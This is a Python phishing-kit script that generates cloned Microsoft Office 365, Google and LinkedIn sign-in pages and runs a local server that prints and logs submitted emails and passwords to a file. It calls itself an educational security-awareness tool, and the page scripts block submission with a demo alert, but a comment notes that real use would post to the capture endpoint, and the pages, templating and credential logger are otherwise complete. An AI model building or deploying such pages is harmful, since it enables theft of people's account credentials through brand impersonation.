#!/usr/bin/env python3
import os
import json
import random
import string
import hashlib
from datetime import datetime
from jinja2 import Template
import base64
import argparse

class PhishingPageBuilder:
    def __init__(self):
        self.templates = {}
        self.config = {}
        self.load_templates()
    
    def load_templates(self):
        """Load phishing page templates"""
        self.templates = {
            'office365': {
                'name': 'Microsoft Office 365',
                'html': '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Microsoft Office 365</title>
    <style>
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background: linear-gradient(135deg, #0078d4 0%, #106ebe 100%);
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .login-container {
            background: white;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
            width: 100%;
            max-width: 400px;
        }
        .microsoft-logo {
            text-align: center;
            margin-bottom: 30px;
        }
        .microsoft-logo img {
            width: 120px;
        }
        h1 {
            color: #323130;
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 8px;
        }
        .subtitle {
            color: #605e5c;
            margin-bottom: 24px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        input[type="email"],
        input[type="password"] {
            width: 100%;
            padding: 12px;
            border: 1px solid #d1d1d1;
            border-radius: 4px;
            font-size: 14px;
            box-sizing: border-box;
        }
        input[type="email"]:focus,
        input[type="password"]:focus {
            outline: none;
            border-color: #0078d4;
        }
        .btn-primary {
            width: 100%;
            background: #0078d4;
            color: white;
            border: none;
            padding: 12px;
            border-radius: 4px;
            font-size: 14px;
            cursor: pointer;
            font-weight: 600;
        }
        .btn-primary:hover {
            background: #106ebe;
        }
        .links {
            margin-top: 20px;
            text-align: center;
        }
        .links a {
            color: #0078d4;
            text-decoration: none;
            font-size: 13px;
            margin: 0 10px;
        }
        .footer {
            margin-top: 30px;
            text-align: center;
            color: #605e5c;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="microsoft-logo">
            <!-- Microsoft logo would go here -->
            <div style="color: #0078d4; font-size: 24px; font-weight: bold;">Microsoft</div>
        </div>
        
        <h1>Sign in</h1>
        <div class="subtitle">to continue to Office 365</div>
        
        <form id="loginForm" action="{{ submit_url }}" method="POST">
            <div class="form-group">
                <input type="email" id="email" name="email" placeholder="Email, phone, or Skype" required>
            </div>
            
            <div class="form-group" id="passwordGroup" style="display: none;">
                <input type="password" id="password" name="password" placeholder="Password" required>
                <input type="hidden" name="session_id" value="{{ session_id }}">
                <input type="hidden" name="user_agent" id="userAgent">
                <input type="hidden" name="timestamp" id="timestamp">
            </div>
            
            <button type="button" id="nextBtn" class="btn-primary">Next</button>
            <button type="submit" id="submitBtn" class="btn-primary" style="display: none;">Sign in</button>
        </form>
        
        <div class="links">
            <a href="#">Sign-in options</a>
            <a href="#">Forgot my password</a>
        </div>
        
        <div class="footer">
            <div>© 2024 Microsoft</div>
            <div>Terms of Use | Privacy & Cookies</div>
        </div>
    </div>

    <script>
        document.getElementById('userAgent').value = navigator.userAgent;
        document.getElementById('timestamp').value = new Date().toISOString();
        
        document.getElementById('nextBtn').addEventListener('click', function() {
            var email = document.getElementById('email').value;
            if (email) {
                document.getElementById('passwordGroup').style.display = 'block';
                document.getElementById('nextBtn').style.display = 'none';
                document.getElementById('submitBtn').style.display = 'block';
            }
        });
        
        // Simulate form submission for demo
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            alert('This is a security awareness demo. In a real phishing attack, your credentials would be stolen.');
            // In actual testing, this would submit to your capture endpoint
            // this.submit();
        });
    </script>
</body>
</html>
                ''',
                'fields': ['email', 'password']
            },
            
            'google': {
                'name': 'Google G Suite',
                'html': '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google</title>
    <style>
        body {
            font-family: 'Roboto', Arial, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background: white;
        }
        .login-container {
            width: 100%;
            max-width: 400px;
            padding: 48px 40px 36px;
            border: 1px solid #dadce0;
            border-radius: 8px;
        }
        .google-logo {
            text-align: center;
            margin-bottom: 16px;
        }
        .google-logo div {
            color: #5f6368;
            font-size: 24px;
            font-weight: 400;
        }
        h1 {
            color: #202124;
            font-size: 24px;
            font-weight: 400;
            text-align: center;
            margin-bottom: 8px;
        }
        .subtitle {
            color: #5f6368;
            text-align: center;
            margin-bottom: 24px;
        }
        .form-group {
            margin-bottom: 24px;
        }
        input[type="email"],
        input[type="password"] {
            width: 100%;
            padding: 13px 15px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            box-sizing: border-box;
        }
        input[type="email"]:focus,
        input[type="password"]:focus {
            outline: none;
            border-color: #1a73e8;
            box-shadow: 0 0 0 2px #e8f0fe;
        }
        .btn-container {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 32px;
        }
        .btn-link {
            color: #1a73e8;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }
        .btn-primary {
            background: #1a73e8;
            color: white;
            border: none;
            padding: 10px 24px;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
        }
        .btn-primary:hover {
            background: #1669d6;
        }
        .footer {
            margin-top: 40px;
            text-align: center;
            color: #5f6368;
            font-size: 12px;
        }
        .language-selector {
            text-align: center;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="google-logo">
            <div>Google</div>
        </div>
        
        <h1>Sign in</h1>
        <div class="subtitle">Use your Google Account</div>
        
        <form id="loginForm" action="{{ submit_url }}" method="POST">
            <div class="form-group">
                <input type="email" id="email" name="email" placeholder="Email or phone" required>
            </div>
            
            <div class="form-group" id="passwordGroup" style="display: none;">
                <input type="password" id="password" name="password" placeholder="Enter your password" required>
                <input type="hidden" name="session_id" value="{{ session_id }}">
                <input type="hidden" name="user_agent" id="userAgent">
                <input type="hidden" name="timestamp" id="timestamp">
            </div>
            
            <div class="btn-container">
                <a href="#" class="btn-link">Create account</a>
                <button type="button" id="nextBtn" class="btn-primary">Next</button>
                <button type="submit" id="submitBtn" class="btn-primary" style="display: none;">Sign in</button>
            </div>
        </form>
        
        <div class="footer">
            <div>English (United States)</div>
            <div>Help Privacy Terms</div>
        </div>
    </div>

    <script>
        document.getElementById('userAgent').value = navigator.userAgent;
        document.getElementById('timestamp').value = new Date().toISOString();
        
        document.getElementById('nextBtn').addEventListener('click', function() {
            var email = document.getElementById('email').value;
            if (email) {
                document.getElementById('passwordGroup').style.display = 'block';
                document.getElementById('nextBtn').style.display = 'none';
                document.getElementById('submitBtn').style.display = 'block';
            }
        });
        
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            alert('This is a security awareness demo. In a real phishing attack, your credentials would be stolen.');
        });
    </script>
</body>
</html>
                ''',
                'fields': ['email', 'password']
            },
            
            'linkedin': {
                'name': 'LinkedIn',
                'html': '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LinkedIn Login, Sign in | LinkedIn</title>
    <style>
        body {
            font-family: -apple-system, system-ui, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            margin: 0;
            padding: 0;
            background: #f3f2ef;
        }
        .header {
            background: white;
            padding: 12px 0;
            border-bottom: 1px solid #e0e0e0;
        }
        .header-container {
            max-width: 1128px;
            margin: 0 auto;
            display: flex;
            align-items: center;
            padding: 0 24px;
        }
        .linkedin-logo {
            color: #0a66c2;
            font-size: 24px;
            font-weight: bold;
        }
        .main-container {
            max-width: 1128px;
            margin: 0 auto;
            padding: 48px 24px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .welcome-section {
            flex: 1;
            max-width: 600px;
        }
        .welcome-section h1 {
            color: #8f5849;
            font-size: 56px;
            font-weight: 200;
            margin-bottom: 8px;
        }
        .login-container {
            background: white;
            padding: 24px;
            border-radius: 8px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
            width: 100%;
            max-width: 400px;
        }
        .login-container h2 {
            color: #000000e6;
            font-size: 32px;
            font-weight: 400;
            margin-bottom: 8px;
        }
        .form-group {
            margin-bottom: 16px;
        }
        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 14px;
            border: 1px solid #00000099;
            border-radius: 4px;
            font-size: 16px;
            box-sizing: border-box;
        }
        input[type="text"]:focus,
        input[type="password"]:focus {
            outline: none;
            border-color: #0a66c2;
            box-shadow: 0 0 0 1px #0a66c2;
        }
        .btn-primary {
            width: 100%;
            background: #0a66c2;
            color: white;
            border: none;
            padding: 14px;
            border-radius: 24px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-bottom: 16px;
        }
        .btn-primary:hover {
            background: #004182;
        }
        .separator {
            text-align: center;
            margin: 16px 0;
            color: #00000099;
            position: relative;
        }
        .separator:before {
            content: "";
            position: absolute;
            top: 50%;
            left: 0;
            right: 0;
            height: 1px;
            background: #e0e0e0;
        }
        .separator span {
            background: white;
            padding: 0 16px;
        }
        .btn-secondary {
            width: 100%;
            background: white;
            color: #00000099;
            border: 1px solid #00000099;
            padding: 12px;
            border-radius: 24px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }
        .join-now {
            text-align: center;
            margin-top: 20px;
            color: #00000099;
        }
        .join-now a {
            color: #0a66c2;
            text-decoration: none;
            font-weight: 600;
        }
        .footer {
            background: white;
            padding: 24px;
            text-align: center;
            color: #00000099;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="header">
        <div class="header-container">
            <div class="linkedin-logo">LinkedIn</div>
        </div>
    </div>

    <div class="main-container">
        <div class="welcome-section">
            <h1>Welcome to your professional community</h1>
        </div>
        
        <div class="login-container">
            <form id="loginForm" action="{{ submit_url }}" method="POST">
                <div class="form-group">
                    <input type="text" id="email" name="email" placeholder="Email or Phone" required>
                </div>
                
                <div class="form-group">
                    <input type="password" id="password" name="password" placeholder="Password" required>
                    <input type="hidden" name="session_id" value="{{ session_id }}">
                    <input type="hidden" name="user_agent" id="userAgent">
                    <input type="hidden" name="timestamp" id="timestamp">
                </div>
                
                <button type="submit" class="btn-primary">Sign in</button>
            </form>
            
            <div class="separator">
                <span>or</span>
            </div>
            
            <button class="btn-secondary">
                Sign in with Google
            </button>
            
            <div class="join-now">
                New to LinkedIn? <a href="#">Join now</a>
            </div>
        </div>
    </div>

    <div class="footer">
        <div>LinkedIn Corporation © 2024</div>
    </div>

    <script>
        document.getElementById('userAgent').value = navigator.userAgent;
        document.getElementById('timestamp').value = new Date().toISOString();
        
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            alert('This is a security awareness demo. In a real phishing attack, your credentials would be stolen.');
        });
    </script>
</body>
</html>
                ''',
                'fields': ['email', 'password']
            }
        }
    
    def generate_session_id(self):
        """Generate a unique session ID"""
        return hashlib.md5(str(datetime.now().timestamp()).encode()).hexdigest()[:16]
    
    def build_phishing_page(self, template_name, output_dir='output', 
                          submit_url='/capture', custom_params=None):
        """Build a phishing page from template"""
        if template_name not in self.templates:
            raise ValueError(f"Template '{template_name}' not found")
        
        # Create output directory
        os.makedirs(output_dir, exist_ok=True)
        
        # Prepare template variables
        template_vars = {
            'submit_url': submit_url,
            'session_id': self.generate_session_id(),
            'timestamp': datetime.now().isoformat()
        }
        
        if custom_params:
            template_vars.update(custom_params)
        
        # Render template
        template = Template(self.templates[template_name]['html'])
        rendered_html = template.render(**template_vars)
        
        # Save to file
        output_file = os.path.join(output_dir, f"{template_name}_phishing.html")
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(rendered_html)
        
        # Generate configuration file
        config = {
            'template': template_name,
            'service_name': self.templates[template_name]['name'],
            'generated_at': datetime.now().isoformat(),
            'session_id': template_vars['session_id'],
            'capture_fields': self.templates[template_name]['fields'],
            'submit_url': submit_url
        }
        
        config_file = os.path.join(output_dir, f"{template_name}_config.json")
        with open(config_file, 'w') as f:
            json.dump(config, f, indent=2)
        
        print(f"[+] Generated phishing page: {output_file}")
        print(f"[+] Configuration saved: {config_file}")
        
        return output_file, config_file
    
    def create_capture_server(self, port=8080):
        """Create a simple capture server for testing"""
        from http.server import HTTPServer, BaseHTTPRequestHandler
        import urllib.parse
        
        class CaptureHandler(BaseHTTPRequestHandler):
            def do_GET(self):
                if self.path == '/':
                    self.send_response(200)
                    self.send_header('Content-type', 'text/html')
                    self.end_headers()
                    self.wfile.write(b'<h1>Phishing Capture Server</h1><p>Ready to capture credentials.</p>')
                else:
                    self.send_response(404)
                    self.end_headers()
            
            def do_POST(self):
                content_length = int(self.headers['Content-Length'])
                post_data = self.rfile.read(content_length)
                parsed_data = urllib.parse.parse_qs(post_data.decode())
                
                print(f"\n[!] CAPTURED CREDENTIALS:")
                print(f"    Timestamp: {parsed_data.get('timestamp', [''])[0]}")
                print(f"    Session ID: {parsed_data.get('session_id', [''])[0]}")
                print(f"    User Agent: {parsed_data.get('user_agent', [''])[0]}")
                print(f"    Email: {parsed_data.get('email', [''])[0]}")
                print(f"    Password: {parsed_data.get('password', [''])[0]}")
                
                # Save to file
                with open('captured_credentials.log', 'a') as f:
                    f.write(f"{datetime.now().isoformat()} - {parsed_data}\n")
                
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(b'<h1>Login Successful</h1><p>Thank you for participating in this security awareness exercise.</p>')
            
            def log_message(self, format, *args):
                # Suppress default logging
                return
        
        server = HTTPServer(('localhost', port), CaptureHandler)
        print(f"[+] Capture server running on http://localhost:{port}")
        print("[+] Ready to capture credentials...")
        
        try:
            server.serve_forever()
        except KeyboardInterrupt:
            print("\n[!] Capture server stopped")
            server.shutdown()

class SecurityAwarenessModule:
    """Security awareness and educational components"""
    
    @staticmethod
    def generate_educational_page(captured_data):
        """Generate an educational page after credential capture"""
        html = '''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Security Awareness Training</title>
            <style>
                body {
                    font-family: Arial, sans-serif;
                    max-width: 800px;
                    margin: 0 auto;
                    padding: 40px;
                    line-height: 1.6;
                }
                .alert {
                    background: #fff3cd;
                    border: 1px solid #ffeaa7;
                    padding: 20px;
                    border-radius: 5px;
                    margin-bottom: 20px;
                }
                .tips {
                    background: #d1ecf1;
                    border: 1px solid #bee5eb;
                    padding: 20px;
                    border-radius: 5px;
                }
            </style>
        </head>
        <body>
            <div class="alert">
                <h2>🔒 Security Awareness Alert</h2>
                <p><strong>This was a simulated phishing exercise!</strong></p>
                <p>You just demonstrated how easy it is to fall for a phishing attack.</p>
            </div>
            
            <div class="tips">
                <h3>How to Spot Phishing Attempts:</h3>
                <ul>
                    <li>✅ Check the URL carefully before entering credentials</li>
                    <li>✅ Look for HTTPS and valid certificates</li>
                    <li>✅ Be suspicious of urgent or threatening language</li>
                    <li>✅ Verify the sender's email address</li>
                    <li>✅ Don't click on suspicious links in emails</li>
                    <li>✅ Use multi-factor authentication when available</li>
                </ul>
                
                <h3>What to Do Now:</h3>
                <ul>
                    <li>If you entered real credentials, change your passwords immediately</li>
                    <li>Report this exercise to your security team</li>
                    <li>Complete any required security awareness training</li>
                </ul>
            </div>
            
            <p><em>This exercise was conducted for educational purposes as part of security awareness training.</em></p>
        </body>
        </html>
        '''
        return html

def main():
    parser = argparse.ArgumentParser(description='Automated Phishing Page Builder - For Educational Use Only')
    parser.add_argument('--template', choices=['office365', 'google', 'linkedin'], 
                       help='Template to generate')
    parser.add_argument('--list-templates', action='store_true', 
                       help='List available templates')
    parser.add_argument('--output-dir', default='phishing_pages',
                       help='Output directory for generated pages')
    parser.add_argument('--start-capture', action='store_true',
                       help='Start capture server after generation')
    parser.add_argument('--port', type=int, default=8080,
                       help='Port for capture server')
    
    args = parser.parse_args()
    
    builder = PhishingPageBuilder()
    
    if args.list_templates:
        print("Available Templates:")
        for template_name, template_info in builder.templates.items():
            print(f"  - {template_name}: {template_info['name']}")
        return
    
    if args.template:
        # Generate specified template
        output_file, config_file = builder.build_phishing_page(
            args.template,
            output_dir=args.output_dir,
            submit_url=f'http://localhost:{args.port}/capture'
        )
        
        print(f"\n[+] Successfully generated {args.template} phishing page")
        print(f"[+] Open {output_file} in a web browser to test")
        
        if args.start_capture:
            print(f"\n[+] Starting capture server on port {args.port}")
            builder.create_capture_server(args.port)
    else:
        # Generate all templates
        for template_name in builder.templates.keys():
            builder.build_phishing_page(
                template_name,
                output_dir=args.output_dir,
                submit_url=f'http://localhost:{args.port}/capture'
            )
        
        print(f"\n[+] Generated all templates in {args.output_dir}/")
        
        if args.start_capture:
            print(f"\n[+] Starting capture server on port {args.port}")
            builder.create_capture_server(args.port)

if __name__ == "__main__":
    main()
